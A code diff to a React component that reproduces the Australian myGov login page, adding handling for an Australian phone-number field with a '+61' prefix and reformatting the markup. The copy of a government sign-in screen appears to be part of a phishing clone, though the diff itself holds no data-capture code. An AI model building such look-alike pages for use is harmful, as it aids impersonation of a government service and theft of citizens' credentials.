@@ -1,10 +1,27 @@
-import React from "react";
+import React, { useState } from "react";
 import img from "./image/img.svg";
 import img2 from "./image/img2.svg";
 import back from "./image/back.svg";
 import "./Mygov.css";
 
 export default function Mygov() {
+  const [value, setValue] = useState("");
+  const [isFocused, setIsFocused] = useState(false);
+
+  const handleChange = (e) => {
+    let inputValue = e.target.value.replace(/\D/g, ""); // Remove non-numeric characters
+
+    // Remove the "61" prefix if it's there
+    if (inputValue.startsWith("61")) {
+      inputValue = inputValue.slice(2);
+    }
+
+    // Limit to 8 digits
+    inputValue = inputValue.slice(0, 8);
+
+    setValue(inputValue);
+  };
+
   return (
     <div className="main-container">
       <header role="banner" className="mgvEnhanceHeader">
@@ -41,15 +58,18 @@ export default function Mygov() {
                   <div className="digital-id-login-card-wrapper">
                     <div className="digital-id-main-login-card override">
                       <div className="back-link">
-
-                        <img src={back} alt="back button" className="back-icon" />
-                      <a
-                        data-go-back-link=""
-                        className="button-back"
-                        href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=close"
-                      >
-                        Back
-                      </a>
+                        <img
+                          src={back}
+                          alt="back button"
+                          className="back-icon"
+                        />
+                        <a
+                          data-go-back-link=""
+                          className="button-back"
+                          href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=close"
+                        >
+                          Back
+                        </a>
                       </div>
                       <div
                         id="passkey-auth-error"
@@ -116,7 +136,12 @@ export default function Mygov() {
                             name="phone"
                             aria-required="true"
                             type="text"
-                            autocomplete="off"
+                            autoComplete="off"
+                            placeholder={isFocused ? "+61 --" : ""}
+                            value={isFocused ? `+61 ${value}` : value}
+                            onChange={handleChange}
+                            onFocus={() => setIsFocused(true)}
+                            onBlur={() => setIsFocused(false)}
                           />
                         </div>
 
